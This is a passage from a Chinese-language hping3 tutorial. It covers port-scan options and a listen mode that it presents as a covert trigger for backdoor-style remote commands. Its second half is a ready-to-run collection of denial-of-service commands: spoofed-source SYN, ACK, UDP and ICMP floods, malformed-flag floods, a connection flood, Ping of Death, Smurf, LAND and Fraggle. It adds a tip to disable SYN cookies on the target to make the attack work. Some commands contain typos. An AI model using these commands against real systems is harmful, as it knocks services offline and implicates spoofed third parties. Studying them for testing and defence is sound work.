| 无 | `--tcp-timestamp` | 无 | **启用 TCP 时间戳选项（TCP Option 8）。** 常用于测量 RTT、推算目标系统的节拍率（HZ）及运行时间（Uptime）。 |

#### 3.2.5 扫描模式

在 `hping3` 的 `-8`（`--scan`）模式下，工具会自动循环指定的端口范围，并根据返回的 ICMP 或 TCP 响应包（如 `SYN+ACK`、`RST`）实时判定端口的开放状态。

:::: info 常见使用场景与例子

1. **SYN 常见已知服务端口扫描（Known Ports Scan）**

    ```shell
    hping3 -8 known -S 10.0.0.1
    ```

    ::: note 参数解析

    - `-8 known`：开启端口扫描模式，扫描范围设为已知服务端口。

    - `-S`：使用 TCP SYN 半开放扫描机制。

    :::

    **作用**：快速扫描目标主机 `10.0.0.1` 上所有在系统 `/etc/services` 文件中注册过的常见服务端口（如 21, 22, 23, 80, 443 等）。

    **判定逻辑**：收到 **`SYN+ACK`** 判为开放（`Open`），收到 **`RST`** 判为关闭（`Closed`），无响应或超时判为被拦截（`Filtered`）。

2. **指定常用端口组合扫描（针对 Web 与管理服务）**

    ```shell
    hping3 -8 22,80,443,3306,8080 -S -c 1 10.0.0.1
    ```

    ::: note 参数解析

    - `-8 22,80,...`：使用逗号分隔指定多个特定端口。

    - `-c 1`：对列表中**每个端口**仅尝试发送 1 个探测包。

    :::

    **作用**：精确扫描目标主机的 22（SSH）、80（HTTP）、443（HTTPS）、3306（MySQL）及 8080（Web 代理）端口，且针对每个端口仅发送 1 个探测包（加快扫描速度）。

3. **UDP 指定范围端口扫描（全速 UDP 扫描）**

    ```shell
    hping3 -8 50-100 -2 -d 30 -i m10 10.0.0.1
    ```

    ::: note 参数解析

    - `-8 50-100`：扫描 50 至 100 范围内的端口。

    - `-2`：切换为 UDP 扫描模式（`-8` 默认是 TCP 模式，扫描 UDP 必须显式加上 `-2`）。

    - `-d 30`：填充 30 字节的 UDP Payload（UDP 无载荷探测容易被过滤或不响应）。

    - `-i m10`：设置发包间隔为 10 毫秒，防止发包过快导致目标系统的 ICMP 限速。

    :::

    **作用**：对目标主机的 `50` 到 `100` 端口进行 UDP 协议扫描，设置发包间隔为每 10 毫秒一次，并填充 30 字节的垃圾载荷。

    **判定逻辑**：若收到 **ICMP Port Unreachable**，说明端口关闭；若无响应，推测端口可能开放或被防火墙过滤（`Open|Filtered`）。

4. **ACK 防火墙穿透/策略扫描（探测未过滤端口）**

    ```shell
    hping3 -8 1-1024 -A 10.0.0.1
    ```

    ::: note 参数解析

    - `-A`：发送 TCP ACK 报文而非 SYN 报文。

    :::

    **作用**：使用 TCP ACK 数据包扫描目标 `1-1024` 端口。此方法不用于检测端口是否开放，而是用于检测**防火墙的 ACL 过滤规则**。

    **判定逻辑**：若收到回应 **`RST`**，说明该端口在防火墙上是**开放穿透（Unfiltered）**的；若完全无响应，说明被有状态防火墙规则**阻断（Filtered）**。

::::

| <div style="width:50px; margin: 0 auto;">短选项</div> | <div style="width:150px; margin: 0 auto;">长选项</div> | <div style="width:150px; margin: 0 auto;">参数格式</div> | 解释 |
| :---: | :---: | :---: | --- |
| `-8` | `--scan` | `<ports\|known>` | **启用端口扫描模式。** 参数可接端口范围（如 `-8 1-1024`）、单个或逗号分隔的端口（如 `-8 80,443,8080`），或接关键字 `known`（扫描 `/etc/services` 中列出的常见已知服务端口）。 |
| `-S` | `--syn` | 无 | **配合 `-8` 进行 TCP SYN 扫描（默认常用模式）。** 仅发送 SYN 包建立半开放连接探测。 |
| `-A` | `--ack` | 无 | **配合 `-8` 进行 TCP ACK 扫描。** 发送 ACK 包测试端口是否被防火墙/ACL 过滤。 |
| `-F` | `--fin` | 无 | **配合 `-8` 进行 TCP FIN 扫描。** 绕过某些有状态防火墙，利用 RFC 793 响应差异判断端口状态。 |
| `-X` | `--xmas` | 无 | **配合 `-8` 进行 TCP Xmas 扫描。** 同时开启 FIN、PUSH 和 URG 标志位进行隐蔽扫描。 |
| `-2` | `--udp` | 无 | **配合 `-8` 切换为 UDP 端口扫描模式。** 对指定的 UDP 端口范围进行探测。 |
| `-a` | `--spoof` | `<hostname\|ip>` | **伪造源 IP 地址进行隐蔽扫描。** 接伪造的 IP（如 192.168.1.100），<font color="red"><b>注意：伪造后本地将接收不到扫描回应。</b></font> |
| 无 | `--rand-source` | 无 | **随机源地址模式。** 每次扫描发送的数据包使用自动随机生成的伪造源 IP 。 |
| `-s` | `--baseport` | `<port_num>` | **指定扫描时的基础源端口。** 取值范围 0-65535，缺省为随机值。支持 `+`（如 `-s 1024 +1`）使源端口递增。 |
| `-k` | `--keep` | 无 | **保持固定源端口。**防止源端口在扫描过程中发生自动递增变动。 |
| `-u` | `--end` | `<port_num>` | **在没有显式指定范围时，设置端口递增（`-p +1`）的界限端口。** 如 `-u 100` 。 |
| `-i` | `--interval` | `<interval_val>` | **控制端口扫描的频率/发包间隔。** 支持秒（如 `-i 1`）、毫秒（如 `-i m10` 代表 10ms）、微秒（如 `-i u1000`）或 `X` 字符开启极速模式。 |
| 无 | `--flood` | 无 | **以最大能力极速发包扫描（相当于 `-i u0`）。** 忽略回包接收，通常用于评估防火墙承载极限。 |
| `-c` | `--count` | `<num>` | **指定针对扫描范围内的每个端口发送的数据包数量。** 接正整数（如 `-c 1`），缺省对每个端口尝试发送数次直到判定状态。 |
| `-d` | `--data` | `<data_size>` | **指定扫描数据包中填充的 Payload 大小（单位：字节）。** 如 `-d 0`（默认）或在 UDP 扫描时设置 `-d 30` 填充载荷。 |
| `-o` | `--tos` | `<tos_hex>` | **设置扫描包的 IP 服务类型（Type of Service）。** 如 0x10（低延迟）、0x08（高吞吐），用于测试 QoS 对扫描流量的处理。 |

#### 3.2.6 监听模式

`hping3` 的 `-9`（`--listen`）模式可以将主机变成一个隐蔽的**报文监听与触发终端**。不同于标准的 TCP/UDP Socket 服务端（需要绑定并监听某个特定端口，容易被 `netstat` 或 `lsof` 查出来），`-9` 模式利用了底层网卡抓包机制（基于 libpcap / Raw Socket）。

这意味着：**即便主机上没有开启任何服务端口，甚至防火墙阻断了所有入站端口，只要数据包到达网卡，`-9` 模式就能捕获并识别其中的隐蔽签名（Signature）。**

:::: info 常见使用场景与例子

1. **基于 ICMP Payload 的隐秘触发 / 端口敲门（Port Knocking）**

    **应用场景**：在受控服务器上静默等待特定的 ICMP Ping 数据包，收到特定触发指令后启动应急防护脚本或开启管理入口。

    **接收端（服务器）：**

    ```shell
    hping3 -9 "activate_firewall_rule" -1
    ```

    **发送端（控制端）：**

    ```shell
    hping3 -1 -e "activate_firewall_rule" 10.0.0.1 -c 1

    ```

    **原理解析**：

    - **接收端**使用 `-9 "activate_firewall_rule"` 监听任何载荷中含有该字符串的数据包，并通过 `-1` 将范围锁定在 ICMP 协议。服务器上无需开启任何 UDP 或 TCP 监听端口。

    - **发送端**使用 `-1`（ICMP 模式）配合 `-e`（写入签名载荷），将字符串隐藏在标准的 ICMP Echo Request（Ping 包）的 Payload 中发送。

    - 当包到达服务器网卡时，`hping3 -9` 匹配到该签名即触发响应。对外部扫描器而言，这只是一次普通的 Ping 操作。

2. **结合 Shell 脚本实现命令行隐秘后门 / 远控指令触发**

    **应用场景**：利用 Linux 的管道和 Shell 机制，当监听到特定标志的控制数据包时，自动执行本地命令（如清理日志、重启服务）。

    **接收端（服务器）：**

    ```shell
    hping3 -9 "CMD_CLEAN_LOGS" -2 -I eth0 | while read line; do echo "Executing Log Cleanup..."; /usr/local/bin/clean_logs.sh; done
    ```

    **发送端（控制端）：**

    ```shell
    hping3 -2 -p 53 -e "CMD_CLEAN_LOGS" 10.0.0.1 -c 1
    ```

    **原理解析**：

    - **接收端**在后台监听网卡 `eth0` 上的 UDP 包（`-2`）。一旦在数据包载荷中匹配到 `"CMD_CLEAN_LOGS"` 签名，`hping3` 会向标准输出打印匹配提示。

    - 配合 Shell 的 `while read line` 循环，系统在捕获到输出的瞬间立即调用执行本地脚本 `/usr/local/bin/clean_logs.sh`。

    - **发送端**伪装向服务器的 `53`（DNS）端口发送 UDP 报文，甚至可以结合 `-a`（伪造源 IP）发送，无需建立连接即可在远端触发命令。

3. **利用 TCP 未使用标志位（Xmas / SYN 组合）的隐蔽信道**

    **应用场景**：避开常规网络安全设备（如 Web 应用防火墙 WAF 或基于明文载荷检测的 IDS），使用畸形 TCP 包头标志位结合 Payload 进行高度隐蔽的信号传输。

    **接收端（服务器）：**

    ```shell
    hping3 -9 "SECRET_PASS" -S -V
    ```

    **发送端（控制端）：**

    ```shell
    hping3 -S -p 443 -e "SECRET_PASS" -a 8.8.8.8 10.0.0.1 -c 1
    ```

    **原理解析**：
    - **接收端**结合 `-S` 限制仅检测带有 SYN 标志位的 TCP 数据包，开启 `-V`（详细模式）以便在匹配到 `"SECRET_PASS"` 时打印完整的数据包首部（包含 IP 地址、TTL、端口等信息）。

    - **发送端**向目标的 443（HTTPS）端口发送包含签名的 SYN 包，并伪造源 IP 为 `8.8.8.8`。

    - 由于发送的是 SYN 包，即使目标主机的 443 端口未开放，防火墙或系统协议栈回复 `RST` 报文也不影响网卡层面上 `hping3 -9` 对该入站包的捕获与指令解析。

4. **基于进程退出码（Exit Code）的自动化链路检测**

    **应用场景**：在自动化运维或渗透测试脚本中，阻塞等待某个特定的隐蔽信号，收到信号后立即退出并返回状态码给上层脚本。

    **接收端脚本：**

    ```bash
    hping3 -9 "RELEASE_LOCK" --tcpexitcode -S
    if [ $? -ne 0 ]; then
        echo "Received signal, unlocking process..."
    fi
    ```

    **原理解析**：

    - 配合 `--tcpexitcode` 参数使用时，`hping3` 在监听到符合签名的最后一个 TCP 包时，会将该数据包的 TCP 标志位（`th_flags`）作为进程的退出码（Exit Code）返回。

    - Shell 脚本通过检查 `$?`（上一步命令的退出码）即可无缝对接后续流程，实现优雅的进程级信号同步。

::::

| <div style="width:50px; margin: 0 auto;">短选项</div> | <div style="width:150px; margin: 0 auto;">长选项</div> | <div style="width:150px; margin: 0 auto;">参数格式</div> | 解释 |
| :---: | :---: | :---: | --- |
| `-9` | `--listen` | `<signature_str>` | **启用监听模式。** 接字符串参数作为触发签名（Signature）。当网卡捕获到载荷中包含该签名文本的数据包时，将触发输出显示或后续动作。 |
| `-I` | `--interface` | `<if_name>` | **指定 hping3 监听的网络接口（网卡）。** 接网卡名称（如 `-I eth0`、`-I wlan0`），缺省为主机默认路由网卡。 |
| `-0` | `--rawip` | 无 | **仅监听匹配签名的 RAW IP 报文。** 将捕获范围限定在原始 IP 协议层。 |
| `-1` | `--icmp` | 无 | **仅监听匹配签名的 ICMP 报文。** 例如用于监听特定隐蔽 ICMP Ping 包或 ICMP 数据传输。 |
| `-2` | `--udp` | 无 | **仅监听匹配签名的 UDP 数据包。** 将捕获范围限定在 UDP 传输层。 |
| `-S` | `--syn` | 无 | **仅监听包含了签名且设置了 TCP SYN 标志位的数据包。** 常用于端口敲门（Port Knocking）检测。 |
| `-A` | `--ack` | 无 | **仅监听包含了签名且设置了 TCP ACK 标志位的数据包。** |
| `-F` | `--fin` | 无 | **仅监听包含了签名且设置了 TCP FIN 标志位的数据包。** |
| `-V` | `--verbose` | 无 | **开启详细输出模式（Verbose）。** 触发签名匹配时，打印详细的数据包头部信息与 Hex/ASCII 载荷。 |
| 无 | `--tcpexitcode` | 无 | **监听到匹配签名的最后一个 TCP 包时，将该包的 th_flags 标志位组合作为 hping3 进程的 Shell 退出码返回。** |

:::: caution

在 `hping3` 中，`-9`（或 `--listen`）参数**必须**指定一个字符串作为签名（Signature）。

如果你直接执行 `-9` 后面不接任何参数（例如直接输入 `hping3 -9`），系统会直接报错并拒绝运行。

```bash
$ hping3 -9
hping3: option requires an argument -- 9
usage: hping3 host [options]
...

```

或者当 `-9` 后面直接跟着其他选项时，`hping3` 会**误将下一个选项名当作签名**：

```bash
$ hping3 -9 -1
# 此时 hping3 会把 "-1" 这两个字符误当成你要监听的字符串 signature！
```

---

`-9` 的设计本质是**特征匹配**。如果我们**不关心载荷中的字符串**，只是想让 `hping3` 像 `tcpdump` 一样监听并打印通过网卡的所有数据包，可以通过以下两种方式实现：

**方案一：将签名设置为通配的单个字符（如空格或常用字符）**

在 `-9` 后传一个极度常见甚至为空的特征，例如一个空格：

```shell
hping3 -9 " " -I eth0
```

*（只要数据包中带有空格，就会被捕获并打印）*

**方案二：使用单独的 `-0` / `--rawip` 模式（无需 `-9`）**

如果你只是想单纯捕获或看网卡上的数据包，直接使用 Raw IP 模式结合详细输出 `-V` 即可：

```shell
hping3 -0 -V -I eth0
```

::::

## 4. 常用命令

:::: details **TCP SYN Flood**

下面这条命令用于执行伪造源 IP 的 SYN 洪水攻击（SYN Flood）。

它向目标主机 10.35.1.80 的 80 端口以最快速度发送伪造了源地址的 TCP SYN 同步数据包，是一种典型的拒绝服务（DoS/DDoS）测试手段。

```shell
hping3 -a 100.37.1.2 -d 120 -S -w 64 -p 80 --flood 10.35.1.80
```

::: info 参数说明

- `hping3`：一款开源的命令行网络探测和安全审计工具，常用于生成定制的 TCP/IP 数据包。

- `-a 100.37.1.2`：伪造源 IP 地址（Spoof Source IP）。将所有发出的数据包源 IP 篡改伪装为 100.37.1.2。这既能隐藏攻击者的真实身份，又能使目标的响应流量（SYN-ACK）全部错误地发送给被伪造的受害者。

- `-d 120`：每个数据包附带 120 字节的正文数据（Payload）。

- `-S`：设置 TCP 标志位为 SYN（同步），用于请求建立 TCP 连接。

- `-w 64`：设置 TCP 窗口大小（Window Size）为 64 字节。

- `-p 80`：攻击的目标端口为 80 端口（常用于 HTTP Web 服务）。

- `--flood`：洪水模式。不等待任何目标回应，以机器性能的极限速度高频发送数据包。

- `10.35.1.80`：本次测试的目标服务器 IP 地址。

:::

如果攻击 CentOS 效果不明显可以先关闭 CentOS 中的 `TCP_SYNCookies` 。该选项默认值是 1 ，即启用 syn cookies 功能，此功能能够有效地防止 SYN Flood 攻击。

```shell
echo 0 > /proc/sys/net/ipv4/tcp_syncookies 
```

::::

:::: details **TCP ACK Flood**

下面的命令是一个用于执行 ACK 洪水攻击（ACK Flood） 的拒绝服务（DoS）测试命令。

它通过伪造大量的随机源 IP 地址，向目标主机的 80 端口（通常是 HTTP Web 服务）极快地发送大量设置了 ACK 标志的 TCP 数据包，以此来消耗目标的网络带宽和系统资源。

```shell
hping3 -c 20000 -d 120 -A -w 64 -p 80 --flood --rand-source <目标IP>
```

::: info 参数说明

- `hping3`：一款开源的命令行网络探测和安全审计工具，常用于生成定制的 TCP/IP 数据包。

- `-c 20000`：发送数据包的总数为 20,000 个。但在结合后文的 --flood 参数时，这个限制通常会被忽略，系统会尽可能快地持续发送。

- `-d 120`：每个数据包的报文正文（Payload）大小为 120 字节。

- `-A`：设置 TCP 标志位为 ACK（确认应答）。

- `-w 64`：设置 TCP 窗口大小（Window Size）为 64 字节。

- `-p 80`：将所有流量的目标端口定向到 80 端口。

- `--flood`：洪水模式。以高强度、无间隔的最快速度发送数据包，不等待目标主机的任何回应。

- `--rand-source`：随机源地址模式。hping3 会在每次发送数据包时，伪造一个完全随机的源 IP 地址。这用于隐藏攻击者的真实 IP，并让目标防火墙难以通过单一 IP 阻断流量。

:::

::::

:::: details **Data ack and push Flood**

下面的命令是一条高强度的 TCP 混淆流量冲击 / 拒绝服务（DoS/DDoS）压力测试命令。

通过结合极速发包（`--flood`）、伪造随机源 IP（`--rand-source`）以及组合控制标志位（`-PA`，即 PUSH + ACK），它能够向目标指定端口发起高密度的畸形/异常 TCP 流量冲击。

```shell
hping3 --flood --rand-source -PA -p <目标端口> <目标 IP>
```

::: info 参数说明

- `--flood`：洪水发包模式。以系统和网卡所能达到的最大极限速度发包。

- `--rand-source`：每次发包自动伪造并随机切换源 IP 地址。

- `-PA`：组合标志位 (`-P` + `-A`)。同时开启 TCP 的 PSH（推送数据）和 ACK（确认）标志位。即向目标发送带有 PUSH+ACK 标志的 TCP 数据包。

- `-p <目标端口>`：指定目的端口。指定攻击/测试的目标端口（如 80、443 或 8080 等）。

- `<目标IP>`：目标设备的 IP 地址。

:::

::::

:::: details **UDP Flood**

下面的命令是一条高强度的 UDP 洪水攻击（UDP Flood）/ 流量型拒绝服务（DoS）压力测试命令。

通过结合极速发包（`--flood`）、数据载荷填充（`-d 120`）以及伪造随机源 IP（`--rand-source`），它旨在瞬间制造大量的 UDP 垃圾流量，以榨干目标网络的链路带宽或瘫痪目标主机的网卡与协议栈。

```shell
hping3 -c 50000 -d 120 --udp -p <目标端口> --flood --rand-source <目标IP>
```

::: info 参数说明

- `-c 50000`：设定最大发送数据包数量为 50,000 个。

- `-d 120`：在每个 UDP 数据包中填充 120 字节的数据（数据体内容通常为随机或零填充）。（注：填充载荷是为了增加单个数据包的体积，从而成倍放大对网络带宽的消耗）。

- `--udp`：UDP 模式。向目标发送 UDP 传输层数据包。

- `-p <目标端口>`：指定目标端口（如 53、123 或 80 等）。

- `--flood` ：洪水发包模式。以系统和网卡所能达到的最大极限速度发包。

- `--rand-source`：随机源地址。每次发包自动伪造并随机切换源 IP 地址。

- `<目标IP>`：目标设备的 IP 地址。

:::

::::

:::: details **ICMP Flood**

下面的命令是一条针对目标 IP 发起的 ICMP 洪水攻击（ICMP Flood / Ping Flood）压力测试命令。

```shell
hping3 -c 10000 -d 120 --icmp --flood --rand-source <目标 IP>
```

::: info 参数说明

- `-c 10000`：设定最大发送数据包数量为 10,000 个。

- `-d 120`：在每个 ICMP 包体中填充 120 字节的数据。

- `--icmp`：开启 ICMP 模式。发送 ICMP Echo Request（即类似传统 Ping 包）数据包。

- `--flood`：洪水发包模式。以系统和网卡所能达到的极限速度发包。

- `--rand-source`：随机源地址模式。每次发包都会自动伪造并随机切换源 IP。

- `<目标IP>`：目标设备的 IP 地址。

:::

::::

:::: details **ICMP Echo Reply Flood**

下面的命令强制将数据包指定为 ICMP Echo Reply。当目标主机收到这种「自己从未发送过 Echo Request 却收到的 Reply 响应」时，操作系统内核或防火墙的有状态检测模块需要处理这些无状态异常报文，可能引发更多的 CPU 资源开销。

```bash
hping3 -c 10000 -d 120 --icmp -C 0 --flood --rand-sourcet <目标 IP>
```

::: info 参数说明

- `-c 10000`：设定最大发送数据包数量为 10,000 个。

- `-d 120`：在每个 ICMP 包体中填充 120 字节的数据。

- `--icmp`：开启 ICMP 模式。发送 ICMP Echo Request（即类似传统 Ping 包）数据包。

- `-C 0`：指定 ICMP 报文类型（Type）为 0。ICMP Type 0 代表 ICMP Echo Reply（Ping 应答包）。

- `--flood`：洪水发包模式。以系统和网卡所能达到的极限速度发包。

- `--rand-source`：随机源地址模式。每次发包都会自动伪造并随机切换源 IP。

- `<目标IP>`：目标设备的 IP 地址。

:::

::::

:::: details **特殊标志位的 DoS 攻击**

**设置 FIN 和 RST 标志位的 DoS 攻击**

正常情况下，FIN 标志和 RST 标志是不能同时出现在一个 TCP 报文中的。而且 RFC 也没有规定 IP 协议栈如何处理这样的畸形报文，因此，各个操作系统的协议栈在收到这样的报文后的处理方式也不同，攻击者就可以利用这个特征，通过发送 FIN 和 RST 同时设置的报文，来判断操作系统的类型，然后针对该操作系统，进行进一步的攻击。

```shell
hping3 -c 10000 -d 120 -F -R -w 64 -p 80 --flood --rand-source <目标 IP>
```

::: info 参数说明

- `-c 10000`：设定最大发送数据包数量为 10,000 个。

- `-d 120`：在每个 TCP 数据包中填充 120 字节的数据。

- `-F`：设置 TCP FIN 标志位（表示请求关闭连接）。

- `-R`：设置 TCP RST 标志位（表示强行复位/重置连接）。

- `-w 64`：设置 TCP 报头中的滑动窗口大小为 64 字节。模拟正常的 TCP 窗口声明。

- `-p 80`：指定目标端口为 80 。

- `--flood`：洪水发包模式。

- `--rand-source`：随机源地址模式,每次发包自动伪造并随机切换源 IP 地址。

- `<目标IP>`：目标设备的 IP 地址。

:::

**设置 ACK 和 RST 标志位的 DoS 攻击**

正常情况下，ACK 标志和 RST 标志是不能同时出现在一个 TCP 报文中的。而且 RFC 也没有规定 IP 协议栈如何处理这样的畸形报文，因此，各个操作系统的协议栈在收到这样的报文后的处理方式也不同，攻击者就可以利用这个特征，通过发送 ACK 和 RST 同时设置的报文，来判断操作系统的类型，然后针对该操作系统，进行进一步的攻击。

```shell
hping3 -c 10000 -d 120 -A -R -w 64 -p 80 --flood --rand-source <目标 IP>
```

::: info 参数说明

- `-c 10000`：设定最大发送数据包数量为 10,000 个。

- `-d 120`：在每个 TCP 数据包中填充 120 字节的数据。

- `-A`：设置 TCP ACK 标志位（确认号有效，通常用于确认已接收到的数据包）。

- `-R`：设置 TCP RST 标志位（表示强行复位/重置连接）。

- `-w 64`：设置 TCP 报头中的滑动窗口大小为 64 字节。模拟正常的 TCP 窗口声明。

- `-p 80`：指定目标端口为 80 。

- `--flood`：洪水发包模式。

- `--rand-source`：随机源地址模式,每次发包自动伪造并随机切换源 IP 地址。

- `<目标IP>`：目标设备的 IP 地址。

:::

::::

:::: details **TCP 连接攻击**

Connection Flood 是典型的并且非常的有效的利用小流量冲击大带宽网络服务的攻击方式，这种攻击方式目前已经越来越猖獗。这种攻击的原理是利用真实的 IP 地址向终端发起大量的连接，并且建立连接之后很长时间不释放，占用终端的资源，造成终端终端上残余连接 (WAIT 状态) 过多，效率降低，甚至资源耗尽，无法响应其他客户所发起的连接。

下面这条命令就是针对目标 IP 发起的 高并发 TCP 全连接（TCP Full Connect / Application Flood）压力测试 命令。使用 `--tcp-connect` 参数要求系统完成完整的 TCP 三次握手（Handshake），以建立真正的底层连接。

在 `--tcp-connect` 模式下，由于完成了三次握手，连接会直接进入 Accept Queue（全连接队列） 并分配真正的 Socket 套接字和 TCP 接收/发送缓冲区。这不仅消耗目标的网络带宽，还会剧烈消耗目标操作系统的 内存（Socket Buffer）、文件描述符（FD, File Descriptors） 以及 Web 服务器（如 Nginx, Apache, Netty）的线程池/并发连接上限。

```shell
hping3 --tcp-connect --rate=90000 -c 900000 -q <目标 IP>
```

::: info 参数说明

- `--tcp-connect`：TCP 全连接模式。强制完成完整的 TCP 三次握手。（注意：在此模式下，不能配合 `--rand-source` 使用，必须使用真实的本机 IP 才能完成三次握手）。

- `--rate=90000`：指定发送速率为每秒 90,000 个包（即每秒尝试建立约 9 万次 TCP 连接）。

- `-c 900000`：设定最大发包总数为 900000 。即发送/连接次数为 900,000 次。

- `-q`：安静模式。运行期间不打印每个数据包的具体回包，仅在结束时打印总结统计。

- `<目标 IP>`：目标设备的 IP 地址。

:::

::::

:::: details **伪造源 IP 进行 ICMP 探测**

下面这条命令是一条非常基础且典型的 伪造源 IP 进行 ICMP 探测（带源地址伪造的 Ping） 命令。

hping3 会构造一个 ICMP Echo Request（Ping 请求包），其 IP 头部的 Source IP 填入 伪装IP，Destination IP 填入 目标IP，然后将数据包发送出去。

当 目标IP 收到这个 Ping 请求包时，若其防火墙放行 ICMP 且系统响应 Ping，它会按照 IP 协议规则生成一个 ICMP Echo Reply（Ping 应答包）。

::: caution
由于请求包里的源地址被改成了 伪装IP，目标IP 会将应答包发送给 伪装IP，而不会发给当前运行 hping3 命令的本机。
:::

运行行该命令的本机将永远接收不到目标的任何回包（控制台会一直处于等待或发包状态，接收到的包计数为 0）。

```shell
hping3 -1 -a <伪装 IP> <目标 IP>
```

::: info 参数说明

- `-1`：指定使用 ICMP 协议（相当于 Ping 请求）。

- `-a <伪装 IP>`：伪造源 IP 地址。

- `<目标 IP>`：目标设备的 IP 地址。

:::

::::

:::: details **Ping of Death**

Ping of death 是一种拒绝服务攻击，方法是由攻击者故意发送大于 65,536 比特的 IP 数据包给对方。

标准的 IP 数据包最大长度限制（MTU/Maximum Packet Size）为 65,535 字节（含 IP 头部）。下面这条命令使用 `-d 70000` 填充了 70,000 字节的 ICMP 载荷，加上 20 字节 IP 报头和 8 字节 ICMP 报头，总体积达到了 70,028 字节，严重超过了 IP 协议规定的上限。

由于单个数据包远超链路 MTU（通常为 1500 字节），网卡与底层协议栈会将这 70,000 字节的数据拆分成数几十个 IP 分片包（IP Fragments） 依次发送。

当目标 IP 接收到这堆分片包并尝试在内存重组（Reassembly）为一个完整数据包时，若目标的操作系统协议栈缺乏边界检查（常见于旧版 Windows/Linux 内核或嵌入式设备），重组缓冲区会直接发生内存越界溢出（Buffer Overflow），导致系统崩溃蓝屏（BSOD）、内核 panic 或设备重启。

```shell
hping3 -1 -d 70000 -c 1 <目标IP>
```

::: info 参数说明

- `-1`：指定使用 ICMP 协议（相当于 Ping 请求）。

- `-d 70000`：填充 70,000 字节的数据载荷。

- `-c 1`：仅发送 1 个数据包（对于有漏洞的系统，单个畸形重组包即可触发崩溃）。

- `<目标 IP>`：目标设备的 IP 地址。

:::

::::

:::: details **访问 0 号端口的畸形流量测试**

根据 RFC 793 / IANA 规范，TCP/UDP 端口 0 为保留端口，不应有任何应用程序绑定或监听。当目标服务器的内核协议栈收到目标端口为 0 的 TCP/UDP 数据包时，系统必须在内核态进行额外的判断、抛出异常或回复 RST（UDP 要回复 ICMP 端口不可达报文）。大量端口 0 报文可能触发某些缺乏边界检查的旧式设备或安全组件的内核 Bug。

```shell
hping3 -c 10000 -d 120 -w 64 -p 0 --flood --rand-source <目标 IP>
```

```shell
hping3 -c 10000 -d 120 --udp -p 0 --flood --rand-source <目标 IP>
```

::: info 参数说明

- `-c 10000`：设定最大发送数据包数量为 10,000 个。

- `-d 120`：在每个 TCP 数据包中填充 120 字节的数据。

- `-w 64`：设置 TCP 报头中的滑动窗口大小为 64 字节。模拟正常的 TCP 窗口声明。

- `--udp`：设置为 UDP 模式。

- `-p 0`：指定目标端口为 0 。

- `--flood`：洪水发包模式。

- `--rand-source`：随机源地址模式,每次发包自动伪造并随机切换源 IP 地址。

- `<目标IP>`：目标设备的 IP 地址。

:::

::::

:::: details **ICMP Smurf Attack**

Smurf 攻击是一种经典的反射型放大拒绝服务攻击（Reflective Amplification DoS）。ICMP SMURF 攻击利用的是网络广播的原理来发送大量的连接, 而包的源地址就是要攻击的机器本身的地址; 因而所有接收到此包的主机都将给包的源地址发送一个 ICMP 回复包。

```shell
hping3 -1 -a <目标 IP> <目标服务器广播地址>
```

::: info 参数说明

- `-1`：指定使用 ICMP 协议（发送 ICMP Echo Request / Ping 请求包）。

- `-a <目标 IP>`：伪造源 IP 地址。将发送出的 ICMP 请求包中的源 IP 替换为被攻击者的 目标IP（即被害者）。

- `<目标服务器广播地址>`：攻击的目标接收方，设为某个网络的子网广播地址（如 192.168.1.255 或 10.0.0.255）。

:::

::::

:::: details **TCP Land Attack**

着陆攻击 LAND Attack 也是一种拒绝服务攻击 DOS。LAND 是 Local Area Network Denial 的缩写，意思是局域网拒绝服务攻击，翻译为着陆攻击只是一种错误的理解。

原理：攻击者向目标主机发送一个带有 SYN 标志位的 TCP 数据包，但将该数据包的 源 IP 地址 设置为 目标 IP 地址，将 源端口 设置为 目标端口（例如：源 IP:80 -> 目标 IP:80）。

后果：目标主机在收到这个包后，认为收到了一条连接建立请求，于是尝试向源地址发送 SYN+ACK 响应。但由于源地址就是它自己，这会导致目标向自己发送响应并试图与自己建立握手。在缺乏防御的旧式协议栈（如 Windows NT、旧版 Linux 等）中，系统会陷入无限环回的内存/CPU 资源死循环，导致系统卡死或蓝屏崩溃。

```shell
hping3 -n -S -a <目标 IP> -k -s 80 -p 80 --flood <目标 IP>
```

::: info 参数说明

- `-S`：设置 TCP SYN 标志位。向目标发送 TCP 连接建立请求报文。

- `-a <目标IP>`：伪造源 IP 地址（IP Spoofing）。将数据包 IP 头部中的源地址强行替换为目标主机本身的 IP 。

- `-k`：锁定源端口。阻止 hping3 默认的「每发一个包源端口自动 +1 」的行为，确保所有数据包的源端口始终固定为 `-s` 指定的值。

- `-s 80`：指定源端口为 80。配合 `-k` 使用，使发出的每个数据包源端口都固定为 80。

- `-p 80`：指定目标端口为 80。

- `--flood`：洪水发包模式。以系统和网卡所能达到的极限速度发包。

- `<目标IP>`：目标设备的 IP 地址。

:::

::::

:::: details **Fraggle Attack**

Fraggle 攻击对 Smurf 攻击作了简单的修改，使用的是 UDP 应答消息而非 ICMP。

Fraggle 攻击 与 Smurf 攻击 都属于经典的 反射型放大拒绝服务攻击（Reflective Amplification DDoS）。两者的攻击逻辑、放大机制和后果完全一致，最核心的区别在于 传输层协议的不同：Smurf 使用 ICMP 协议，而 Fraggle 使用 UDP 协议。

```shell
hping3 -2 -a <目标 IP> <目标服务器广播地址>
```

::: info 参数说明

- `-2`：指定使用 UDP 协议（发送 UDP 数据包）。

- `-a <目标 IP>`：伪造源 IP 地址。将 UDP 数据包中的源 IP 替换为受害者的 目标 IP。

- `<目标服务器广播地址>`：攻击的目标接收方，设为某个网络的子网广播地址（如 192.168.1.255 或 10.0.0.255）。

:::

::::

## 参考资料

<div class="vp-card-container" style="justify-content: flex-start;">
  <VPCard
    title="hping3 | Kali Linux Tools"
    desc="作者：Kali Linux"
    logo="https://www.kali.org/images/favicon.svg"
    link="https://www.kali.org/tools/hping3/"
    background="rgba(253, 230, 138, 0.15)"
  />
  <VPCard
    title="hping 官方 Github 仓库"
    desc="作者：Salvatore Sanfilippo"
    logo="https://github.com/fluidicon.png"
    link="https://github.com/antirez/hping"
    background="rgba(253, 230, 138, 0.15)"
  />
</div>
